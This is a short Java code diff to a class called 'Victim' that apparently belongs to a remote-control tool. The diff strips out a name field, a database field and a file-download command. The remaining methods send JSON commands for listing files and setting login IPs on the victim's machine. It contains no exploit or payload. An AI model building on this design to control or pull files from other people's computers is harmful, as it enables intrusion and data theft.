@@ -7,8 +7,6 @@ import java.util.ArrayList;
 
 public abstract class Victim extends Client {
 
-    protected DBUsers dbUsers;
-    String name;
     ArrayList<String> owners;
 
     void sendGetFiles(String path, String owner) {
@@ -25,10 +23,6 @@ public abstract class Victim extends Client {
         query.put("path", path);
         query.put("owner", owner);
         sendMessage(query);
-    }
-
-    String getName() {
-        return name;
     }
 
     ArrayList<String> getOwners() {
@@ -81,15 +75,6 @@ public abstract class Victim extends Client {
         JSONObject query = new JSONObject();
         query.put("action", "set.login.ips");
         query.put("ips", ips);
-        query.put("owner", owner);
-        sendMessage(query);
-    }
-
-    void sendStartDownloadFile(String path, long port, String owner) {
-        JSONObject query = new JSONObject();
-        query.put("action", "start.download.file");
-        query.put("path", path);
-        query.put("port", port);
         query.put("owner", owner);
         sendMessage(query);
     }
